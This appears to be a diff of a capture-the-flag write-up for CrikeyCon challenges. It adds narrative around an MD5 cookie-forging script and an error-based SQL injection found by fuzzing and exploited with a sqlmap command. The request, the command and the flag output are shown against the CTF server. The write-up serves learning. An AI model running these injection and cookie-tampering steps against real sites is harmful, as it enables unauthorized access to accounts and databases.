@@ -88,11 +88,14 @@ Content-Type: text/html; charset=UTF-8
 ```
 
 
+The page revealed a few pictures of koala's with various names (ie. john.jpg) along with a KoalaCookie value which appeared to be an MD5 hash. Running each name of each image through md5sum revealed a match for the KaolaCookie value.
+
 ```
 root@blackhat:/pentest/lists/passwords# echo "bob" | md5sum
 e01096b9ffe3f416157f6ec46c467725  -
 ```
 
+I then created a python script to automatically calculate the md5 of each name and replace the KoalaCookie value being sent to the server.
 
 ```python
 ### CrikeyCon CTF Koala Gallery Exploit by 1N3@CrowdShield
@@ -135,9 +138,6 @@ for i in range(num):
     time.sleep(3)
     
 ```
-
-
-
 
 ```html
 root@blackhat:/pentest/development/python# python md5sum.py 
@@ -458,7 +458,7 @@ Koala Gallery - flag{dr0ppy_the_dr0pb34r}<html>
 Success!
 ```
 
-
+Lo and behold, the flag was found!
 
 flag{dr0ppy_the_dr0pb34r}
 
@@ -473,9 +473,12 @@ Retrieve the admin password
 http://ctf.crikeycon.com:8003
 
 
+The page revealed a simple login form which I immediately fuzzed by inputting (') for the username and password. This revealed a SQL error message which indicated the form was vulnerable to error base MySQL injection...
+
+
 ### SQLi Fuzzing
 
-```html
+```
 POST / HTTP/1.1
 Host: ctf.crikeycon.com:8003
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0
@@ -503,12 +506,11 @@ You have an error in your SQL syntax; check the manual that corresponds to your 
 
 ```
 
-
-
-
 ### SQLMap Exploitation
 
-```html
+Following this discovery, I passed the work over to SQLMap to continue the exploitation and capture the flag.
+
+```
 root@blackhat:~# sqlmap -u 'http://ctf.crikeycon.com:8003/' --data='username=%27&password=&login=Submit+Query' --risk=1 --cookie='connect.sid=s%3A2K6sIvSsPyc0M8W96l0DrFXiJkW1mGQd.vp9sSrmQ6NlXc2ymNkcqywsOjO9JKHEF1evVc0mwofI;session=.eJwVz1FrgzAUBeC_Mu6zD5q6F6GwslqxcCO6diF5s42ruSYWWkZNSv_7stdzPg6cJ_TamRmKn97ehwSMhiLL8gTm63weoHjC2wkKkG5vOZMPrFqmXOcagV66ncHQTcq1XtExV9QGvi09ujpFUaYYphxFNKRJUmcb0TmkyyJZtKL1Mlw8sh2hwIWHTaoOE5OhzWTYeNxiyql-j54p-p7iDnE6MiXK_D9rqnppqpJJV6-k4LGzIz-MRtF5Da8Efu_Dbe5dPAAZX3183q4P_TWawWp4_QEENVCR.C7P7fw.9gp4AAialH1yX46-_g4QXofF2G;'
         ___
        __H__
